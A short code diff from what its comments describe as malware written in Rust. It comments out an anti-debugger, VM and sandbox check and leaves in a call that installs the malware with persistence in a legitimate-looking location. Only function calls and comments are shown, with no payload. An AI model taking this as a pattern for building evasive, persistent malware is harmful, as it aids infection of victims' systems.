@@ -48,7 +48,7 @@ macro_rules! dead_branches {
 async fn main() {
 
     //checks if debugger, vm, sandbox is being used
-    check_for_analysis_behaviour();
+    //check_for_analysis_behaviour();
 
     //tries to setup persistency and put malware somewhere legit
     setup_malware();
